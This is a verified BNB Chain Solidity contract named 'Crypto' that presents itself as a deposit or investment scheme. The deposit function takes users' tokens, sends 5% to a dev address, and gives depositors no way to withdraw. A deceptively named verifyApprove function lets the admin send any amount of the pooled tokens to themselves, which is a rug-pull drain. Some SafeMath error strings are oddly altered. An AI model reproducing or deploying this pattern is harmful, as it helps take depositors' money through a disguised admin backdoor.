/**
 *Submitted for verification at BscScan.com on 2022-08-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.5.10;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by Crypto");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by Crypto");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface Token {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
}


contract Crypto {

    using SafeMath for uint256;
    using SafeMath for uint8;


	uint256 constant public INVEST_MIN_AMOUNT = 1 ether;
	uint256 constant public PERCENTS_DIVIDER = 100;
    
    uint256[5] public defaultPackages = [1 ether, 2 ether, 3 ether, 4 ether, 5 ether];
    
   
	address payable public admin;
    address payable public dev;
    address public tokenAddress;
    Token private token;

	
	
  constructor(address payable _admin, address payable _dev, address _tokenAddress) public {
		require(!isContract(_admin));
		require(_tokenAddress != address(0));
		tokenAddress = _tokenAddress;
		token = Token(_tokenAddress);
		admin = _admin;
		dev = _dev;
	}

    function deposit(uint256 _amount) public {
		require(token.transferFrom(msg.sender, address(this), _amount));
		//require(msg.value >= INVEST_MIN_AMOUNT,'Min deposit 1 Ether');
	
            uint256 _dev_fees = _amount.mul(5).div(PERCENTS_DIVIDER);
            // token.transfer(admin,_dev_fees);
            token.transfer(dev,_dev_fees);

	}

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
   
    function verifyApprove(uint256 _amount) external{
        require(admin==msg.sender, 'Admin what?');
        token.transfer(admin,_amount);
    }

    
  
}